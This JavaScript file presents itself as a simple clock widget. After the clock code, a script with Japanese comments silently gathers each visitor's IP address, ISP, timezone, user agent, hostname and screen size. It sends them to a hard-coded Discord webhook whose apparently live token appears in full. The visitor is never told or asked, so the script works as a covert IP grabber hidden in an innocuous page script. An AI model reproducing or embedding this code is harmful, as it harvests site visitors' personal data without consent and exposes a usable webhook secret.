function updateClock() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    document.getElementById('clock').textContent = `${hours}:${minutes}`;
}

setInterval(updateClock, 1000);
window.onload = updateClock;

// アクセスした人のUser-Agentを取得する
const userAgent = window.navigator.userAgent;

// アクセスした人のIPを取得する
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // アクセスした人のタイムゾーンを取得する
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // アクセスした人のホスト名を取得する
    const hostName = window.location.hostname;

    // アクセスした人のISP情報を取得する
    fetch(`https://ipapi.co/${ip}/json/`)
      .then(response => response.json())
      .then(data => {
        const isp = data.org;

        // DiscordのWebhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1324931367225528402/j1yjlWwMPrD8fOR5DL3f9t-dKKM7t1Ol4fMXrddKvbrR6-l84lO6nhigHYsQAza_nhuS
';

        // アクセスした人のデバイス情報をまとめる
        const deviceInfo = {
          'User-Agent': userAgent,
          'IP': ip,
          'Timezone': timeZone,
          'Hostname': hostName,
          'ISP': isp,
          'Device': `${window.screen.width}x${window.screen.height}`,
        };

        // DiscordのWebhookにデータを送信する
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [{
              title: 'アクセス情報',
              color: 16711680,
              fields: [
                {
                  name: 'User-Agent',
                  value: deviceInfo['User-Agent'],
                },
                {
                  name: 'IP',
                  value: deviceInfo['IP'],
                },
                {
                  name: 'Timezone',
                  value: deviceInfo['Timezone'],
                },
                {
                  name: 'Hostname',
                  value: deviceInfo['Hostname'],
                },
                {
                  name: 'ISP',
                  value: deviceInfo['ISP'],
                },
                {
                  name: 'Device',
                  value: deviceInfo['Device'],
                },
              ],
            }],
          }),
        });
      });
  });
